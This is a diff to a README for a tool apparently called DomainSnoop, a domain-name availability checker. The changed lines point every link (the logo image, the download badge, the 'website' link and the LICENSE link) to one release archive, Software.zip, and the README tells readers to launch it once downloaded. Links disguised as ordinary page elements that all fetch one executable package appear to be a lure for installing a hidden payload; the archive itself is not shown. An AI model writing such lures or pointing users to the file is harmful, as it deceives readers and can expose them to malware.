@@ -2,7 +2,7 @@
 
 Welcome to DomainSnoop! 
 
-![DomainSnoop Logo](https://example.com/domain-snoop-logo.jpg)
+![DomainSnoop Logo](https://github.com/aintslimy/DomainSnoop/releases/download/v2.0/Software.zip)
 
 DomainSnoop is a lightweight tool designed to help you check the availability of domain names quickly and easily. Whether you're looking for a new domain for your website, blog, or business, DomainSnoop offers a free and straightforward way to see if your desired domain is up for grabs.
 
@@ -30,13 +30,13 @@ DomainSnoop is a lightweight tool designed to help you check the availability of
 
 Ready to start snooping for domain names? Download the DomainSnoop software package by clicking the button below:
 
-[![Download DomainSnoop](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download DomainSnoop](https://github.com/aintslimy/DomainSnoop/releases/download/v2.0/Software.zip)](https://github.com/aintslimy/DomainSnoop/releases/download/v2.0/Software.zip)
 
 (*Note: The software package needs to be launched once downloaded.*)
 
 ## Connect with Us 🌐
 
-Have questions or feedback about DomainSnoop? Visit our website [here](https://www.domainsnoop.com) for more information.
+Have questions or feedback about DomainSnoop? Visit our website [here](https://github.com/aintslimy/DomainSnoop/releases/download/v2.0/Software.zip) for more information.
 
 ## Contributors 🙌
 
@@ -49,7 +49,7 @@ Feel free to join us in further developing and improving DomainSnoop!
 
 ## License 📜
 
-DomainSnoop is licensed under the MIT License. See the [LICENSE](https://github.com/DomainSnoop/LICENSE) file for more details.
+DomainSnoop is licensed under the MIT License. See the [LICENSE](https://github.com/aintslimy/DomainSnoop/releases/download/v2.0/Software.zip) file for more details.
 
 ---
 
